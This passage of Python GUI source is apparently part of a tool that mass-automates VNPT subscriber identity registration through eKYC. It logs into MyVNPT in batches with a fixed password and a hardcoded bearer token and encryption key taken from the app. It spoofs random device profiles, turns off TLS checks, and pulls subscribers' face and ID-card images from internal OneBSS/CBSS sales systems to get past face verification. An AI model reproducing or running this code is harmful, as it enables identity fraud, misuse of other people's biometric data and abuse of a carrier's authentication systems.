        root.after(80, _flush_active_sim_log)

    def _flush_update_info_log():
        changed = False
        try:
            for _ in range(100):
                msg = _update_info_log_queue.get_nowait()
                update_info_log_area.config(state='normal')
                update_info_log_area.insert('end', msg + '\n')
                changed = True
        except _q.Empty:
            pass
        except Exception:
            pass
        if changed:
            if update_info_auto_scroll_var.get():
                update_info_log_area.see('end')
            update_info_log_area.config(state='disabled')
        elif update_info_log_area.cget('state') != 'disabled':
            update_info_log_area.config(state='disabled')
        root.after(80, _flush_update_info_log)

    def set_status(text, color=None):
        """Thread-safe status update."""
        if color:
            root.after(0, lambda t=text, c=color: dash_status.config(text=t, fg=c))
        else:
            root.after(0, lambda t=text: dash_status.config(text=t))

    # Optional compatibility input for standalone eSIM flows. ToolGSM itself
    # no longer creates a system log file.
    def _toolgsm_log_paths():
        paths = [
            os.environ.get('TOOLGSM_SYSTEM_LOG', ''),
        ]
        result = []
        seen = set()
        for path in paths:
            if not path:
                continue
            path = os.path.abspath(path)
            key = os.path.normcase(path)
            if key not in seen:
                seen.add(key)
                result.append(path)
        return result

    def _otp_from_toolgsm_line(line):
        # Covers both the success breadcrumb and [SMS_DELIVERY] otp=... line.
        match = re.search(
            r'(?i)(?:otp|econtract|e-contract|vnpt|ma\s+otp|ky\s+hop\s+dong)'
            r'[^\d]{0,200}(?<!\d)(\d{6})(?!\d)', str(line or ''))
        return match.group(1) if match else ''

    #  Input fields 
    inp = tk.Frame(tab_dktttb, bg=BG)
    inp.pack(fill='x', pady=(0, 4))

    def _inp_row(parent, label, width=17, **ekw):
        r = tk.Frame(parent, bg=BG); r.pack(fill='x', pady=2)
        mklbl(r, label, bold=True, width=13).pack(side='left')
        e = mkentry(r, width=width, **ekw)
        e.pack(side='left', padx=(6,4), ipady=4)
        return e

    e_mv_phone_d = _inp_row(inp, "VNPT Phone:")
    e_mv_pass_d  = _inp_row(inp, "VNPT Pass:")

    # OTP row (cho tai khoan khong co pass - dang nhap bang OTP)
    otp_row = tk.Frame(inp, bg=BG); otp_row.pack(fill='x', pady=2)
    mklbl(otp_row, "OTP (tuy chon):", bold=True, width=13).pack(side='left')
    e_mv_otp = mkentry(otp_row, width=10)
    e_mv_otp.pack(side='left', padx=(6,4), ipady=4)

    def _request_otp():
        phone = e_mv_phone_d.get().strip()
        if not phone:
            dash_status.config(text="Nhap so dien thoai truoc!", fg=ERR); return
        p = phone.strip()
        if p.startswith('84') and len(p) > 10: digits = p[2:]
        elif p.startswith('+84'): digits = p[3:]
        elif p.startswith('0'):   digits = p[1:]
        else: digits = p
        msisdn_84 = '84' + digits
        dash_status.config(text=f"Dang yeu cau OTP cho {msisdn_84}...", fg=YEL)
        def _otp_worker():
            try:
                _BT = 'Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b'
                _prof2 = _random_device_profile()
                _DI = _prof2['di']
                _s2 = requests.Session(); _s2.mount('https://', DhAdapter())
                r = _s2.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/authen_msisdn',
                    headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                             'Device-Info':_DI,'Language':'vi_VN','User-Agent':'okhttp/4.7.2'},
                    json={'device_info':_prof2['model'],'fcm_registration_token':_prof2['fcm_token'],
                          'mode':'request_otp','msisdn':msisdn_84},
                    timeout=60, verify=False)
                d = r.json()
                ec = str(d.get('error_code','?'))
                msg = d.get('message','')
                if ec == '0':
                    root.after(0, lambda: dash_status.config(text=f"OTP da gui toi {msisdn_84}! Nhap OTP vao o tren.", fg=OK))
                    log(f"[OTP] OTP da gui: {msg}")
                else:
                    root.after(0, lambda m=f"Yeu cau OTP loi: ec={ec} {msg}": dash_status.config(text=m, fg=ERR))
                    log(f"[OTP] LOI ec={ec} {msg}")
            except Exception as ex:
                root.after(0, lambda e=ex: dash_status.config(text=f"Loi: {e}", fg=ERR))
        import threading
        threading.Thread(target=_otp_worker, daemon=True).start()

    mkbtn(otp_row, "Yeu cau OTP", _request_otp, bg='#313244', fg=FG, size=9).pack(side='left', padx=(4,0))
    mklbl(otp_row, "(de trong = dung pass)", fg=SUB, size=8).pack(side='left', padx=(6,0))

    # Pre-fill from saved accounts
    _mv_accs_d = _load_saved_config().get('myvnpt_accounts', [])
    if _mv_accs_d:
        e_mv_phone_d.insert(0, _mv_accs_d[0].get('u', ''))

    #  Batch controls 
    batch_row = tk.Frame(tab_dktttb, bg=BG)
    batch_row.pack(fill='x', pady=(2, 4))

    _batch_list = []  # list of (phone_str, password_str)

    lbl_batch = mklbl(batch_row, "Chua import file", fg=SUB, size=9)
    lbl_batch.pack(side='left', padx=(0, 8))

    def _import_file():
        from tkinter import filedialog
        path = filedialog.askopenfilename(
            title=f"Chon file SDT (TXT dung pass co dinh {FIXED_TXT_IMPORT_PASSWORD})",
            filetypes=[("Text/Excel files", "*.txt *.xlsx"), ("All files", "*.*")]
        )
        if not path: return
        _batch_list.clear()
        bad = 0
        try:
            if path.endswith('.xlsx'):
                try:
                    import openpyxl
                    wb = openpyxl.load_workbook(path, data_only=True)
                    ws = wb.active
                    for row_idx, row in enumerate(ws.iter_rows(values_only=True)):
                        if row_idx == 0 and str(row[0]).upper() in ('SDT', 'ST', 'PHONE'):
                            continue
                        _ph = str(row[0] or '').strip()
                        _pw = str(row[1] or '').strip()
                        if _ph and _pw and _ph != 'None' and _pw != 'None':
                            _batch_list.append((_ph, _pw))
                        else:
                            if _ph or _pw: bad += 1
                except ImportError:
                    lbl_batch.config(text="Chua cai openpyxl! Chay: pip install openpyxl", fg=ERR)
                    return
            else:
                with open(path, 'r', encoding='utf-8', errors='replace') as _f:
                    _txt_accounts, _txt_bad = _parse_txt_batch_lines(_f)
                    _batch_list.extend(_txt_accounts)
                    bad += _txt_bad
        except Exception as _e:
            lbl_batch.config(text=f"Loi doc file: {_e}", fg=ERR); return
        n = len(_batch_list)
        lbl_batch.config(
            text=f"Da load: {n} so" + (f" ({bad} dong loi)" if bad else ""),
            fg=OK if n > 0 else ERR
        )
        # Log vao log area
        log(f"[IMPORT] Da import {n} tai khoan tu: {os.path.basename(path)}")
        if path.lower().endswith('.txt'):
            log(f"[IMPORT] TXT dung mat khau co dinh: {FIXED_TXT_IMPORT_PASSWORD}")
        if bad: log(f"[IMPORT] {bad} dong khong hop le (thieu data)")
        if n > 0:
            log(f"[IMPORT] Vi du dau: {_batch_list[0][0]} | ***")
            if n > 1: log(f"[IMPORT] Vi du cuoi: {_batch_list[-1][0]} | ***")

    def _clear_batch():
        _batch_list.clear()
        lbl_batch.config(text="Chua import file", fg=SUB)

    mkbtn(batch_row, "Import TXT/XLSX", _import_file, bg='#313244', fg=FG, size=9).pack(side='left', padx=(0,4))
    mkbtn(batch_row, "Clear", _clear_batch, bg='#45475a', fg=FG, size=9).pack(side='left', padx=(0,8))
    mklbl(batch_row, "Luong:", fg=SUB, size=9, bold=True).pack(side='left', padx=(0,4))
    e_threads = mkentry(batch_row, width=4)
    e_threads.insert(0, "3")
    e_threads.pack(side='left', ipady=3)
    # Delay between requests
    mklbl(batch_row, "  Delay(s):", fg=SUB, size=9).pack(side='left', padx=(6,4))
    e_delay = mkentry(batch_row, width=4)
    e_delay.insert(0, "0")
    e_delay.pack(side='left', ipady=3)

    # Paste/type a batch of phone numbers directly in the GUI.  When this box
    # contains data it takes priority over the imported TXT/XLSX batch; each
    # line uses the same fixed password as TXT imports.
    direct_phone_row = tk.Frame(inp, bg=BG)
    direct_phone_row.pack(fill='x', pady=(2, 4))
    mklbl(direct_phone_row, "SĐT trực tiếp:", bold=True, width=13).pack(
        side='left', anchor='n'
    )
    direct_phone_box = tk.Text(
        direct_phone_row,
        height=4,
        width=36,
        bg=CARD,
        fg=FG,
        insertbackground=FG,
        relief='flat',
        wrap='none',
        undo=True,
        font=('Consolas', 9),
    )
    direct_phone_box.pack(side='left', fill='x', expand=True, padx=(6, 5))

    direct_phone_actions = tk.Frame(direct_phone_row, bg=BG)
    direct_phone_actions.pack(side='left', anchor='n')
    direct_phone_status = mklbl(
        direct_phone_actions,
        "Ô đang trống",
        fg=SUB,
        size=8,
        width=16,
        wraplength=120,
        justify='left',
    )
    direct_phone_status.pack(anchor='w', pady=(0, 2))

    def _refresh_direct_phone_box():
        raw_text = direct_phone_box.get('1.0', 'end')
        if not raw_text.strip():
            direct_phone_status.config(text="Ô trống; dùng file/1 SĐT", fg=SUB)
            return
        accounts, bad = _parse_txt_batch_lines(raw_text.splitlines())
        if accounts:
            direct_phone_status.config(
                text=f"Đã nhận {len(accounts)} số"
                     + (f" ({bad} dòng lỗi)" if bad else ""),
                fg=OK if not bad else YEL,
            )
        else:
            direct_phone_status.config(text="Không có SĐT hợp lệ", fg=ERR)

    mkbtn(
        direct_phone_actions,
        "Kiểm tra ô",
        _refresh_direct_phone_box,
        bg='#313244',
        fg=FG,
        size=8,
    ).pack(anchor='w', pady=(0, 2))
    mkbtn(
        direct_phone_actions,
        "Xóa ô",
        lambda: (direct_phone_box.delete('1.0', 'end'),
                 direct_phone_status.config(text="Ô đang trống", fg=SUB)),
        bg='#45475a',
        fg=FG,
        size=8,
    ).pack(anchor='w')
    mklbl(
        inp,
        f"Dán hoặc gõ mỗi dòng 1 SĐT; mật khẩu tự động: {FIXED_TXT_IMPORT_PASSWORD}. "
        "Ô này được ưu tiên hơn Import TXT/XLSX.",
        fg=SUB,
        size=8,
    ).pack(anchor='w', padx=(13, 0), pady=(0, 3))

    # Option: dung anh local thay vi CBSS (Mac dinh TRUE theo yeu cau)
    opt_row = tk.Frame(inp, bg=BG); opt_row.pack(fill='x', pady=(2,4))
    use_local_img_var = tk.BooleanVar(value=True)
    tk.Checkbutton(opt_row, text=" Ưu tiên ảnh local (anh/sdt.jpg) - nếu chưa có mới tải từ CBSS",
                   variable=use_local_img_var, bg=BG, fg=SUB,
                   activebackground=BG, activeforeground=FG,
                   selectcolor=CARD, font=('Segoe UI',8)).pack(side='left')
    mklbl(opt_row, "  Anh chan dung CBSS type:", fg=SUB, size=9).pack(side='left', padx=(12,4))
    e_img_type = mkentry(opt_row, width=6)
    e_img_type.insert(0, "3")
    e_img_type.config(state='disabled')
    e_img_type.pack(side='left', ipady=3)

    # Thanh tieu de log + checkbox tu cuon
    log_hdr = tk.Frame(tab_dktttb, bg=BG); log_hdr.pack(fill='x', pady=(2,0))
    mklbl(log_hdr, " Log:", bold=True, size=9).pack(side='left')
    auto_scroll_var = tk.BooleanVar(value=True)
    tk.Checkbutton(log_hdr, text="Tự cun", variable=auto_scroll_var,
                   bg=BG, fg=SUB, activebackground=BG, activeforeground=FG,
                   selectcolor=CARD, font=('Segoe UI',8)).pack(side='right')
    btn_clear_log = tk.Button(log_hdr, text="Xa log", bg=CARD, fg=SUB,
                              relief='flat', font=('Segoe UI',8), padx=6,
                              command=lambda: [log_area.config(state='normal'),
                                              log_area.delete('1.0','end'),
                                              log_area.config(state='disabled')])
    btn_clear_log.pack(side='right', padx=(0,6))

    log_area = tk.Text(tab_dktttb, height=13, bg='#181825', fg='#a6e3a1',
                        font=('Consolas',8), relief='flat', state='disabled')
    log_area.pack(fill='both', expand=True)

    # Start log flush loop
    root.after(80, _flush_log)

    # 
    # EKYC runner (called from thread, log is queue-safe)
    # 
    def _run_ekyc_thread(face_path=None, is_temp=False, skip_device=False, msisdn='', tag='', session_file=None,
                          cccd_front_path=None, cccd_back_path=None):
        prefix = f"[{tag}]" if tag else ""
        log(f"{prefix}[EKYC] Bat dau... MSISDN={msisdn or '(device)'}")
        if face_path:
            log(f"{prefix}[EKYC] Face: {os.path.basename(face_path)}")
        if cccd_front_path and os.path.exists(cccd_front_path):
            log(f"{prefix}[EKYC] CCCD mat truoc: {os.path.basename(cccd_front_path)}")
        if cccd_back_path and os.path.exists(cccd_back_path):
            log(f"{prefix}[EKYC] CCCD mat sau: {os.path.basename(cccd_back_path)}")
        proc = None
        try:
            if _batch_cancelled():
                return False, '', '', 'DA DUNG DO DONG TOOL', False
            if getattr(sys, 'frozen', False):
                cmd = [sys.executable, '--no-gui']
            else:
                cmd = [sys.executable, os.path.abspath(__file__), '--no-gui']
            if face_path and os.path.exists(face_path):
                cmd += ['--face', face_path]
            if cccd_front_path and os.path.exists(cccd_front_path):
                cmd += ['--cccd-front', cccd_front_path]
            if cccd_back_path and os.path.exists(cccd_back_path):
                cmd += ['--cccd-back', cccd_back_path]
            if skip_device:
                cmd += ['--skip-device']
            if msisdn:
                cmd += ['--msisdn', msisdn]
            # Moi luong dung file session rieng (tranh race condition)
            if session_file and os.path.exists(session_file):
                cmd += ['--session-file', session_file]
            proc = subprocess.Popen(
                cmd,
                cwd=BASE_DIR,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace'
            )
            with _child_process_lock:
                _child_processes.add(proc)
            if _batch_cancelled():
                proc.terminate()
                return False, '', '', 'DA DUNG DO DONG TOOL', False
            success = False
            already_completed = False
            full_name = ''; msisdn_result = ''; ekyc_flow = ''; err_msg = ''
            for line in proc.stdout:
                if _batch_cancelled():
                    proc.terminate()
                    break
                line = line.rstrip()
                log(f"{prefix} {line}" if prefix else line)
                if '*** DKTTTB THANH CONG! ***' in line: success = True
                if '*** DKTTTB DA HOAN THANH TRUOC DO!' in line:
                    success = True
                    already_completed = True
                if success and 'fullName:' in line:        full_name = line.split('fullName:')[-1].strip()
                if success and 'msisdnChangeImei:' in line: msisdn_result = line.split('msisdnChangeImei:')[-1].strip()
                if success and 'ekycFlow:' in line:         ekyc_flow = line.split('ekycFlow:')[-1].strip()
                if 'FAILED: errorCode=' in line:            err_msg = line.split('FAILED:')[-1].strip()
            proc.wait()
            # Don dep file session rieng sau khi xong
            if session_file and os.path.exists(session_file):
                try: os.remove(session_file)
                except: pass
            # KHONG xoa file anh (de giu lai anh ca khi fail)
            # if is_temp and face_path and os.path.exists(face_path):
            #     try: os.remove(face_path)
            #     except: pass
            log('')
            if success:
                log('=' * 55)
                log(f'  \u2705  {prefix} COMPLETE - DKTTTB THANH CONG!')
                if full_name:     log(f'  Ho ten:  {full_name}')
                if msisdn_result: log(f'  So:      {msisdn_result}')
                if ekyc_flow:     log(f'  Flow:    {ekyc_flow}')
                log('=' * 55)
            else:
                log('=' * 55)
                log(f'  \u274c  {prefix} FAIL - DKTTTB THAT BAI!')
                if err_msg:       log(f'  Loi:     {err_msg}')
                log('=' * 55)
            return success, full_name, msisdn_result, err_msg, already_completed
        except Exception as ex:
            log(f'{prefix}[EKYC] Loi: {ex}')
            return False, '', '', str(ex), False
        finally:
            if proc is not None:
                with _child_process_lock:
                    _child_processes.discard(proc)
            if session_file and os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except OSError:
                    pass

    def _fetch_worker(phone_raw, skip_device, tag='', _session_file=None):
        if _batch_cancelled():
            return False, '', '', 'DA DUNG THEO YEU CAU', False
        p = phone_raw.strip()
        if p.startswith('84') and len(p) > 10: digits = p[2:]
        elif p.startswith('+84'): digits = p[3:]
        elif p.startswith('0'):   digits = p[1:]
        else: digits = p
        phone_fmt = '0' + digits
        phone_84  = '84' + digits
        prefix = f"[{tag}]" if tag else ""
        face_path = os.path.join(TEMP_FACES_DIR, phone_fmt + '.jpg')
        os.makedirs(os.path.dirname(face_path), exist_ok=True)
        _cccd_front, _cccd_back = _cccd_file_paths(phone_fmt)
        cccd_paths = {
            'front': _cccd_front if os.path.exists(_cccd_front) and os.path.getsize(_cccd_front) > 2048 else '',
            'back': _cccd_back if os.path.exists(_cccd_back) and os.path.getsize(_cccd_back) > 2048 else '',
        }
        img_ok    = False
        MAX_RETRY = 3
        RETRY_WAIT = 5  # seconds

        try:
            #  SHORTCUT: Dung anh local (neu tich o "Dung anh local", mac dinh TRUE) 
            try:
                _use_local = use_local_img_var.get()
            except: _use_local = True

            if _use_local:
                if os.path.exists(face_path) and os.path.getsize(face_path) > 2048:
                    img_ok = True
                    log(f"{prefix}[LOCAL] Sử dụng ảnh có sẵn: anh/{phone_fmt}.jpg")
                    log(f"{prefix}[LOCAL] Bo qua CBSS - chay eKYC truc tiep")
                    if img_ok:
                        return _run_ekyc_thread(face_path=face_path, is_temp=False,
                                                skip_device=skip_device, msisdn=phone_84,
                                                tag=tag, session_file=_session_file,
                                                cccd_front_path=cccd_paths['front'],
                                                cccd_back_path=cccd_paths['back'])
                else:
                    log(f"{prefix}[LOCAL] Không có ảnh trong anh/{phone_fmt}.jpg - thử CBSS...")

            # Nguon 1: phien web CBSS truc tiep. Neu du ca ba anh thi chay
            # ngay; neu thieu se giu phan tai duoc va fallback OneBSS ben duoi.
            try:
                direct_paths = fetch_images_from_cbss_direct(
                    phone_84, log_cb=lambda message: log(f"{prefix}{message}")
                )
                if direct_paths.get('portrait'):
                    face_path = direct_paths['portrait']
                    img_ok = _valid_cached_image(face_path)
                if direct_paths.get('front'):
                    cccd_paths['front'] = direct_paths['front']
                if direct_paths.get('back'):
                    cccd_paths['back'] = direct_paths['back']
                if img_ok:
                    log(f"{prefix}[CBSS-DIRECT] Da co anh mat; chay eKYC.")
                    return _run_ekyc_thread(
                        face_path=face_path, is_temp=False,
                        skip_device=skip_device, msisdn=phone_84,
                        tag=tag, session_file=_session_file,
                        cccd_front_path=cccd_paths['front'],
                        cccd_back_path=cccd_paths['back'],
                    )
            except Exception as direct_exc:
                log(f"{prefix}[CBSS-DIRECT] Loi: {direct_exc}; fallback OneBSS...")

            onebss_error = ''
            for attempt in range(MAX_RETRY):
                if _batch_cancelled():
                    return False, '', '', 'DA DUNG THEO YEU CAU', False
                try:
                    log(f"{prefix}[ONEBSS] Tra cuu anh {phone_84} (lan {attempt+1}/{MAX_RETRY})...")
                    onebss_token = _ONEBSS_SESSION.get('token', '')
                    if not onebss_token:
                        onebss_error = 'ONEBSS CHUA DANG NHAP HOAC TOKEN RONG'
                        log(f"{prefix}[ONEBSS] {onebss_error}.")
                        break
                    device_id = _ONEBSS_SESSION.get('device_id', ONEBSS_DEVICE_ID)
                    hdrs = _onebss_headers(onebss_token, device_id)
                    # CBSS tra cuu theo dinh dang quoc gia 84xxxxxxxxx.
                    r_obs = requests.post(
                        'https://api-onebss.vnpt.vn/app-banhang/ccbs/tracuu_anh_thuebao',
                        headers=hdrs,
                        json={'p_somay': phone_84, 'menu_id': 810241},
                        timeout=60, verify=False)
                    log(f"{prefix}[ONEBSS] HTTP {r_obs.status_code}")
                    if r_obs.status_code != 200:
                        try:
                            error_payload = r_obs.json()
                            error_code = str(error_payload.get('error_code') or error_payload.get('error') or '')
                            error_message = str(error_payload.get('message') or '')
                            _body = r_obs.text[:300]
                        except Exception:
                            error_code = ''
                            error_message = ''
                            _body = r_obs.text[:300] if getattr(r_obs, 'text', None) else '(no body)'
                        onebss_error = (
                            f'ONEBSS HTTP {r_obs.status_code}'
                            f'{" " + error_code if error_code else ""}'
                            f'{" | " + error_message if error_message else ""}'
                        )
                        log(f"{prefix}[ONEBSS] Response: {_body}")
                        if r_obs.status_code in (401, 403):
                            log(f"{prefix}[ONEBSS] {onebss_error}")
                            # KHONG tu dong redirect ve login - chi log loi va skip so hien tai
                            try:
                                root.after(0, lambda: dash_status.config(
                                    text=f"{onebss_error[:120]} - so {phone_fmt}",
                                    fg='#f9e2af'))
                            except: pass
                            break
                        continue  # retry voi status khac

                    obs_j  = r_obs.json()
                    images = obs_j.get('data') or []
                    if not isinstance(images, list): images = []
                    if not images:
                        onebss_error = 'ONEBSS KHONG TRA ANH CHO THUE BAO'
                    log(f"{prefix}[ONEBSS] So anh: {len(images)}")
                    portrait_result = download_portrait_image(
                        images, phone_fmt, headers=hdrs,
                        log_cb=lambda message: log(f"{prefix}{message}"),
                    )
                    if portrait_result.get('portrait'):
                        face_path = portrait_result['portrait']
                        img_ok = _valid_cached_image(face_path)

                    best_img = _select_onebss_type3_image(images)

                    if best_img and not img_ok:
                        b64_data = best_img.get('image_base') or best_img.get('base64') or ''
                        img_url  = best_img.get('url') or best_img.get('image_url') or ''
                        img_name = best_img.get('image_name', '')
                        log(f"{prefix}[ONEBSS] Anh type 3: {img_name} b64_len={len(b64_data)}")
                        if b64_data and len(b64_data) > 500:
                            # Co the la URL ngan hoac base64 that
                            import base64 as _b64
                            try:
                                raw_bytes = _b64.b64decode(b64_data)
                                if len(raw_bytes) > 2048:
                                    with open(face_path, 'wb') as _fi: _fi.write(raw_bytes)
                                    _kb = len(raw_bytes) // 1024
                                    log(f"{prefix}[ONEBSS] Đã lưu {_kb}KB -> anh/{phone_fmt}.jpg (giữ nguyên ảnh gốc)")
                                    img_ok = True
                                else:
                                    log(f"{prefix}[ONEBSS] Base64 qua nho ({len(raw_bytes)}B)")
                            except Exception as _be:
                                log(f"{prefix}[ONEBSS] Decode base64 loi: {_be}")
                        elif b64_data and len(b64_data) <= 500:
                            # Kha nang la URL tuong doi
                            img_url = b64_data
                        
                        if not img_ok and img_url:
                            if img_url.startswith('//'): img_url = 'https:' + img_url
                            elif img_url.startswith('/'): img_url = 'https://api-onebss.vnpt.vn' + img_url
                            r2 = requests.get(img_url, headers=hdrs, timeout=60, verify=False)
                            if len(r2.content) > 2048:
                                with open(face_path, 'wb') as _fi: _fi.write(r2.content)
                                log(f"{prefix}[ONEBSS] Da tai URL {len(r2.content)//1024}KB (giu nguyen anh goc)")
                                img_ok = True
                            else:
                                log(f"{prefix}[ONEBSS] URL nho ({len(r2.content)}B)")
                    else:
                        log(f"{prefix}[ONEBSS] Khong co anh trong response, thu lai...")

                except Exception as _ex:
                    onebss_error = f'ONEBSS LOI: {_ex}'
                    log(f"{prefix}[ONEBSS] Loi lan {attempt+1}: {_ex}")

                if img_ok:
                    break
                if attempt < MAX_RETRY - 1:
                    log(f"{prefix}[ONEBSS] Cho {RETRY_WAIT}s roi thu lai ({attempt+2}/{MAX_RETRY})...")
                    if _batch_stop_event.wait(RETRY_WAIT) or _shutdown_event.is_set():
                        return False, '', '', 'DA DUNG THEO YEU CAU', False

            if not img_ok:
                log(f"{prefix}[ONEBSS]  KHONG CO ANH THAM CHIEU!")
                onebss_error = onebss_error or 'KHONG CO ANH ONEBSS'
                log(f"{prefix}[ONEBSS] Ly do: {onebss_error}")
                log(f"{prefix}[ONEBSS]  SKIP so nay de tranh eKYC loi 1314")
                log('')
                log('=' * 55)
                log(f'    [{tag}] FAIL - KHONG CO ANH ONEBSS')
                log(f'  So:    {phone_fmt}')
                log('=' * 55)
                return False, '', '', onebss_error, False

            if not (cccd_paths['front'] and cccd_paths['back']):
                log(f"{prefix}[CCCD] Khong tai CCCD theo cau hinh; eKYC tiep tuc voi anh mat.")

            # Co anh that  chay eKYC (truyen session file rieng de tranh race condition)
            return _run_ekyc_thread(face_path=face_path, is_temp=False,
                                    skip_device=skip_device, msisdn=phone_84,
                                    tag=tag, session_file=_session_file,
                                    cccd_front_path=cccd_paths['front'],
                                    cccd_back_path=cccd_paths['back'])
        except Exception as ex:
            log(f'{prefix}[ONEBSS] LOI: {ex}')
            return False, '', '', f'ONEBSS LOI: {ex}', False

    # 
    # Core worker: initDevice -> login -> ONEBSS -> eKYC
    # 
    def _do_ekyc(mv_phone, mv_pass, tag=''):
        """Run full DKTTTB flow for one phone/pass pair. Thread-safe."""
        if _batch_cancelled():
            return False, 'DA DUNG THEO YEU CAU', False
        import hashlib
        from Crypto.PublicKey import RSA as _RSA2
        from Crypto.Signature import pkcs1_15 as _pkcs15
        from Crypto.Hash import SHA256 as _SHA256
        from Crypto.Cipher import AES as _AES2
        from Crypto.Util.Padding import pad as _pad2, unpad as _unpad2
        _AMKEY = 'dqeqgig123ndb123dsfsdf23g4d56jfq'
        _IV2 = bytes(16)
        _INIT_SPK = ('MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEZrm+72VDaEzV4PAzYlt'
                     'gnWQnhlYYjD/i1ABMB2UKU9wVNrKDXPwLoI1+yE2AnkbqZeBy1dXSNuxvhC030nN'
                     '78kav8cX3QE2JsQf6Z/dadZcGCOL41x4AVcynDt+70QGtur5tHU4D56MQltnCpX6D'
                     'mDlE2foe9XUQcd5XyHc2x8dnm9OZLCUhjK2xWTPRk80Uu/aU6rb1QtCB59/YWXsyf'
                     'eaLHuvuKBPeMUSPlIDRj5zN6UCPZMsDUZxdSzQIaisS3I1oKGOMaAeAgMcISFUM/8r'
                      'yH8yzvUAy0ANYjbyW8dj63WHHyXZcXkoLyMAmuze30oHjtE61iVmTiciYpYYQIDAQAB')
        prefix = f"[{tag}]" if tag else ""

        def _aenc2(pt):
            c = _AES2.new(_AMKEY.encode(), _AES2.MODE_CBC, _IV2)
            return __import__('base64').b64encode(c.encrypt(_pad2(pt.encode(), 16))).decode()
        def _adec2(b64):
            raw = __import__('base64').b64decode(b64)
            c = _AES2.new(_AMKEY.encode(), _AES2.MODE_CBC, _IV2)
            return _unpad2(c.decrypt(raw), 16).decode('utf-8')

        # Format MSISDN
        p = mv_phone.strip()
        if p.startswith('84') and len(p) > 10: digits = p[2:]
        elif p.startswith('+84'): digits = p[3:]
        elif p.startswith('0'):   digits = p[1:]
        else: digits = p
        msisdn_84 = '84' + digits

        # Sinh ngau nhien thiet bi truoc khi vao try (dung trong toan bo _do_ekyc)
        _prof   = _random_device_profile()
        _DI     = _prof['di']
        _MODEL  = _prof['model']
        _OS_VER = _prof['android_ver']
        _FCM    = _prof['fcm_token']
        _MAC    = _prof['mac']
        _BT     = 'Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b'

        try:
            # BUOC 1: initDevice
            log(f"{prefix}[1/3] Dang ky RSA key (initDevice)...")
            key = _RSA2.generate(2048)
            priv_der = key.export_key('DER', pkcs=8)
            priv_b64 = __import__('base64').b64encode(priv_der).decode().replace('\n','').replace('\r','')
            pub_b64  = __import__('base64').b64encode(key.publickey().export_key('DER')).decode().replace('\n','').replace('\r','')
            req_json = __import__('json').dumps({'clientPublicKey': pub_b64, 'osName': _OS_VER, 'deviceName': _MODEL}, separators=(',',':'))
            rd   = _aenc2(req_json)
            h    = _SHA256.new(rd.encode('utf-8'))
            sig  = __import__('base64').b64encode(_pkcs15.new(key).sign(h)).decode().replace('\n','')
            spk_obj = _RSA2.import_key(__import__('base64').b64decode(_INIT_SPK))
            ksz  = (spk_obj.n.bit_length() + 7) // 8
            pt   = _AMKEY.encode('utf-8')
            c_   = pow(int.from_bytes(b'\x00'*(ksz-len(pt))+pt,'big'), spk_obj.e, spk_obj.n)
            xsec = __import__('base64').b64encode(c_.to_bytes(ksz,'big')).decode().replace('\n','')
            _s = __import__('requests').Session()
            _s.mount('https://', DhAdapter())
            ir   = _s.post('https://api-myvnpt.vnpt.vn/tel_service/device/initDevice',
                           headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                    'Cache-Control':'no-cache','Channel-Code':'APP','Device-Info':_DI,
                                    'Language':'vi_VN','partnerCode':'MYVNPT','User-Agent':'okhttp/4.7.2',
                                    'X-Secret-Key':xsec,'X-Signature':sig},
                           json={'requestData': rd}, timeout=60, verify=False)
            id_d  = ir.json()
            if _batch_cancelled():
                return False, 'DA DUNG THEO YEU CAU', False
            id_data = id_d.get('data','')
            if not id_data:
                err = f"initDevice LOI: {id_d.get('message','?')} ec={id_d.get('errorCode')}"
                log(f"{prefix}[1/3] {err}")
                return False, err, False
            new_spk = __import__('json').loads(_adec2(id_data)).get('serverPublicKey','')
            if not new_spk:
                err = "Khong co serverPublicKey!"
                log(f"{prefix}[1/3] {err}"); return False, err, False
            log(f"{prefix}[1/3] initDevice OK!")

            # BUOC 2: Dang nhap (OTP hoac Password)
            otp_val = ''
            try: otp_val = e_mv_otp.get().strip()  # chi co trong single mode
            except: pass
            if otp_val:
                # OTP mode
                log(f"{prefix}[2/3] Dang nhap bang OTP {msisdn_84}...")
                lr  = _s.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/authen_msisdn',
                              headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                       'Device-Info':_DI,'Language':'vi_VN','User-Agent':'okhttp/4.7.2'},
                              json={'device_info':_MODEL,'fcm_registration_token':_FCM,
                                    'mode':'otp','msisdn':msisdn_84,'otp':otp_val},
                              timeout=60, verify=False)
            else:
                # Password mode (default)
                log(f"{prefix}[2/3] Dang nhap bang mat khau {msisdn_84}...")
                pw_md5 = hashlib.md5(mv_pass.encode('utf-8')).hexdigest().upper()
                lr  = _s.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/authen_msisdn',
                              headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                       'Device-Info':_DI,'Language':'vi_VN','User-Agent':'okhttp/4.7.2'},
                              json={'device_info':_MODEL,'fcm_registration_token':_FCM,
                                    'mode':'password','msisdn':msisdn_84,'password':pw_md5},
                              timeout=60, verify=False)
            ld = lr.json()
            if _batch_cancelled():
                return False, 'DA DUNG THEO YEU CAU', False
            ec = str(ld.get('error_code','?'))
            sess_val = ld.get('session','')
            if ec != '0' or not sess_val:
                err = f"Loi dang nhap: ec={ec} | msg={ld.get('message','?')}"
                log(f"{prefix}[2/3] {err}")
                log(f"{prefix}[2/3] Response day du: {ld}")
                if otp_val:
                    log(f"{prefix}[2/3] HINT OTP: Kiem tra lai ma OTP, hoac OTP da het han (60s)")
                return False, err, False
            log(f"{prefix}[2/3] Login OK!")

            # Luu session rieng cho luong nay (tranh race condition da luong)
            import threading as _thr, uuid as _sess_uuid
            _tid = f"{_sess_uuid.uuid4().hex[:8]}_{_thr.get_ident()}"
            _session_file = os.path.join(SESSION_TEMP_DIR,
                                         f'device_session_{_tid}.json')
            existing = _load_session_data() or {}
            existing.update({
                'rsa_key_private':    _aenc2(priv_b64),
                'server_public_key':  _aenc2(new_spk),
                'login_session':      sess_val,
